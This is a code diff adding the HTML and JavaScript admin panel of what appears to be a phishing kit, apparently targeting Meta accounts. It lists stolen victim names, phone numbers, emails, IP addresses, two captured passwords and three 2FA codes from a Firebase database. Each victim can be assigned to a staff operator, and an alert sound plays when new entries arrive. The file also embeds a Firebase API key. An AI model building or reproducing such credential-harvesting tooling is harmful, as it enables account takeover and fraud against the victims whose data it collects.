@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.0.js"
+        integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+    <style>
+        .container {
+            margin-top: 50px;
+        }
+
+        .logout {
+            float: right;
+            margin-bottom: 20px;
+        }
+
+        .validate {
+            color: red;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="">
+        <div class="header">
+            <div class="logout">
+                <button type="submit" id="logout" class="btn btn-primary">Logout</button>
+            </div>
+        </div>
+        <table class="table table-striped">
+            <thead>
+                <tr>
+                    <th scope="col">STT</th>
+                    <th scope="col">Tên</th>
+                    <th scope="col">Số ĐT</th>
+                    <th scope="col">Email</th>
+                    <th scope="col">Địa chỉ IP</th>
+                    <th scope="col">MK Đầu</th>
+                    <th scope="col">MK SAU</th>
+                    <th scope="col">Mã 2FA1</th>
+                    <th scope="col">Mã 2FA2</th>
+                    <th scope="col">Mã 2FA3</th>
+                    <th scope="col">Ngày Tạo</th>
+                    <th scope="col">Nhân Viên</th>
+                    <th scope="col">Thao Tác</th>
+                </tr>
+            </thead>
+            <tbody id='data'>
+            </tbody>
+        </table>
+    </div>
+
+</body>
+<!-- ======= Modal ======= -->
+
+<div class="modal edit-info" id="exampleModalCenter" tabindex="-1" role="dialog"
+    aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLongTitle">Update User</h5>
+                <button type="button" id="close-modal" class="btn-close" data-dismiss="modal" aria-label="Close">
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group mt-2">
+                    <label class="font-s-13" for="exampleInputEmail1">Name</label>
+                    <input type="email" disabled class="form-control h-30 font-s-13" id="name"
+                        aria-describedby="emailHelp">
+                </div>
+                <div class="form-group mt-2">
+                    <label class="font-s-13" for="exampleInputEmail1">Nhân viên phụ trách</label>
+                    <div id="userEl"></div>
+                    <small id="validate-nv" class="validate"></small>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" id="update" class="btn btn-primary">Continue</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="module">
+    var idUser = '';
+    var nameUser = '';
+    var phoneUser = '';
+    var emailUser = '';
+    var ipAddressUser = '';
+    var passwordUser = '';
+    var reasonUser = '';
+    var vnUser = '';
+    var created_at = '';
+    ///list UserName
+    var userName = [
+        'Admin',
+        'nv1',
+        'nv2',
+        'nv3',
+        'nv4',
+        'nv5',
+    ];
+
+    //check admin
+    var isAdmin = localStorage.getItem("admin");
+    if (!isAdmin) {
+        location.href = "login.html"
+    }
+
+    ///logout
+    var logout = document.getElementById('logout');
+    logout.addEventListener('click', function () {
+        localStorage.removeItem('admin');
+        localStorage.removeItem('userName');
+        location.href = "login.html";
+    });
+
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+    import { getFirestore, getDocs, collection, getDoc } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBdBuzImsxpU0wS8tJKnI8cButET1Ma51I",
+  authDomain: "meta-d4d08.firebaseapp.com",
+  projectId: "meta-d4d08",
+  storageBucket: "meta-d4d08.appspot.com",
+  messagingSenderId: "435860027909",
+  appId: "1:435860027909:web:d0431fb2700f169fe6ba6c",
+  measurementId: "G-MN2BS7SSTM"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    let db = firebase.firestore();
+    let dbRefData = db.collection('data');
+    let dbRefDataSort = db.collection('data').orderBy("created_at", "desc")
+    dbRefDataSort.onSnapshot((snapshot) => {
+        const data = snapshot.docs.map((doc) => ({
+            id: doc.id,
+            ...doc.data(),
+        }));
+        let data1 = Object.entries(data);
+
+        console.log(data);
+        var item = "";
+        data1.forEach(([key, value], i) => {
+            addLogEntry(value);
+        });
+        let logs = Object.entries(JSON.parse(localStorage.getItem('logs18') || '[]'));
+        function addLogEntry(entry) {
+            // Lấy danh sách logs hiện tại từ localStorage
+            let logs = JSON.parse(localStorage.getItem('logs18') || '[]');
+
+            // Tìm index của entry với id tương tự trong logs
+            const index = logs.findIndex(log => log.id === entry.id);
+
+            if (index === -1) {
+                // Thêm entry mới nếu nó chưa tồn tại
+                logs.push(entry);
+            } else {
+                // Cập nhật entry nếu nó đã tồn tại
+                logs[index] = entry;
+            }
+
+            // Lưu mảng logs sau khi cập nhật vào localStorage
+            localStorage.setItem('logs18', JSON.stringify(logs));
+        }
+        logs.forEach(([key, value], i) => {
+            var nv = "";
+            var code2FA1 = '';
+            var code2FA2 = '';
+            var code2FA3 = '';
+            var created_at = '';
+            if (value['nv']) {
+                nv = value['nv'];
+            }
+            if (value['twoFA1']) {
+                code2FA1 = value['twoFA1'];
+            }
+            if (value['twoFA2']) {
+                code2FA2 = value['twoFA2'];
+            }
+            if (value['twoFA3']) {
+                code2FA3 = value['twoFA3'];
+            }
+            if (value['created_at']) {
+                created_at = value['created_at']
+            }
+            item += "<tr>";
+            item += "<th scope='row'>" + i + "</th>";
+            item += "<td>" + value['name'] + "</td>";
+            item += "<td>" + value['phone'] + "</td>";
+            item += "<td>" + value['username'] + "</td>";
+            item += "<td>" + value['ip'] + "</td>";
+            item += "<td>" + value['cap1'] + "</td>";
+            item += "<td>" + value['cap2'] + "</td>";
+            item += "<td>" + code2FA1 + "</td>";
+            item += "<td>" + code2FA2 + "</td>";
+            item += "<td>" + code2FA3 + "</td>";
+            item += "<td>" + created_at + "</td>";
+            item += "<td>" + nv + "</td>";
+            item += "<td>";
+            item += "<button type='submit' id='" + value['id'] + "' class='btn btn-warning edit'><i class='bi bi-pencil-fill'></i></button>";
+            item += "<button type='submit' id='" + value['id'] + "' class='btn btn-danger delete'><i class='bi bi-trash3-fill'></i></button>";
+            item += "</td>";
+            item += "</tr>";
+        });
+
+
+        document.getElementById('data').innerHTML = item;
+
+        var editListEL = document.getElementsByClassName('edit');
+
+        for (let i = 0; i < editListEL.length; i++) {
+            editListEL[i].addEventListener('click', function () {
+                var id = editListEL[i].getAttribute('id');
+                idUser = id;
+                const userRef = dbRefData.doc(idUser);
+                userRef.get().then((doc) => {
+                    let user = doc.data();
+                    if (user != '' && user != null) {
+                        $('.edit-info').show();
+                        nameUser = user.name;
+                        var vnUser = "";
+                        if (user.nv) {
+                            vnUser = user.nv;
+                        }
+                        document.getElementById('name').value = user.name;
+                        var userEl = "<select id='nv' class='form-control h-30 font-s-13' aria-label='Default select example'>";
+                        userEl += "<option selected class='form-select form-control' value=''>Chọn Nhân viên</option>";
+                        for (let i = 0; i < userName.length; i++) {
+                            if (vnUser != '' && vnUser == userName[i]) {
+                                userEl += "<option selected value='" + userName[i] + "'>" + userName[i] + "" + "</option>";
+                            } else {
+                                userEl += "<option value='" + userName[i] + "'>" + userName[i] + "" + "</option>";
+                            }
+                        }
+                        userEl += "</select>";
+                        userEl += "<small id='validate-nv' class='validate'></small>";
+                        document.getElementById('userEl').innerHTML = userEl;
+                    } else {
+                        alert('User không tồn tại');
+                    }
+                })
+            })
+        }
+
+        document.getElementById('update').addEventListener('click', function () {
+            var nvpt = document.getElementById('nv').value.trim();
+            var validateNv = document.getElementById('validate-nv');
+            validateNv.innerHTML = '';
+            if (nvpt == '') {
+                validateNv.innerHTML = 'Nhân viên phụ trách không được để trống';
+            } else {
+                const userRef = dbRefData.doc(idUser);
+                userRef.update({
+                    'nv': nvpt
+                }).then(() => {
+                    localStorage.setItem('adminHanddle', 'update');
+                    nameUser = '';
+                }).catch((error) => {
+                    alert('unsuccessfull, error: ' + error);
+                })
+                validateNv.innerHTML = '';
+                $('.modal').hide();
+            }
+        });
+
+        let deleEl = document.getElementsByClassName('delete');
+        var idUserDele;
+        for (let i = 0; i < deleEl.length; i++) {
+            deleEl[i].addEventListener('click', function () {
+                var idDele = deleEl[i].getAttribute('id');
+                idUserDele = idDele;
+                const userRef = dbRefData.doc(idUserDele);
+                userRef.get().then((doc) => {
+                    let user = doc.data();
+                    if (user != '' && user != null) {
+                        $('.noti-2fa').show();
+                        nameUser = user.name;
+                        document.getElementById('noti-mes').innerHTML = 'Bạn có chắc chắn muốn xóa User: ' + nameUser;
+                    } else {
+                        alert('User không tồn tại');
+                    }
+                })
+            })
+        };
+
+        document.getElementById('delete-user').addEventListener('click', function () {
+            const userRef = dbRefData.doc(idUserDele);
+            userRef.delete().then(() => {
+                localStorage.setItem('adminHanddle', 'delete');
+                $('.noti-2fa').hide();
+                document.getElementById('noti-mes').innerHTML = "";
+            }).catch((error) => alert("Error deleting document", error));
+        });
+
+        setTimeout(() => {
+            let adminHanddle = localStorage.getItem('adminHanddle');
+            if (adminHanddle == null || adminHanddle == '') {
+                playSound();
+            } else {
+                localStorage.removeItem('adminHanddle');
+            }
+        }, 1000);
+
+    });
+
+    function playSound() {
+        // Tạo một đối tượng Audio và phát âm thanh chuông
+        var audio = new Audio("thongbao.mp3");
+        audio.play();
+    }
+
+    var closeModal = document.getElementById('close-modal');
+    closeModal.addEventListener('click', function () {
+        $('.edit-info').hide();
+    })
+
+    function removeMesNoti() {
+        $('.noti-2fa').hide();
+        document.getElementById('noti-mes').innerHTML = "";
+    }
+
+    var closeNoti = document.getElementById('close-noti');
+    closeNoti.addEventListener('click', function () {
+        removeMesNoti();
+    });
+
+    var clsNoti = document.getElementById('cls-noti');
+    clsNoti.addEventListener('click', function () {
+        removeMesNoti();
+    });
+
+    $(document).keydown(function (event) {
+        if (event.keyCode == 27) {
+            removeMesNoti();
+            $('.edit-info').hide();
+        }
+    });
+
+    var modalNotification = document.getElementById('exampleModal');
+    var exampleModalCenter = document.getElementById('exampleModalCenter');
+    window.onclick = function (event) {
+        if (event.target == modalNotification) {
+            $('.edit-info').hide();
+            removeMesNoti();
+        }
+        if (event.target == exampleModalCenter) {
+            $('.edit-info').hide();
+        }
+    }
+
+
+</script>
+
+</html>
+<div class="modal noti-2fa" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">Thông báo</h5>
+                <button type="button" id="close-noti" class="btn-close" data-bs-dismiss="modal"
+                    aria-label="Close"></button>
+            </div>
+            <div id="noti-mes" class="modal-body">
+                Chưa có thông báo mới!
+            </div>
+            <div class="modal-footer">
+                <button type="button" id="delete-user" class="btn btn-danger" data-bs-dismiss="modal">Xóa</button>
+                <button type="button" id="cls-noti" class="btn btn-secondary" data-bs-dismiss="modal">Thoát</button>
+            </div>
+        </div>
+    </div>
+</div>
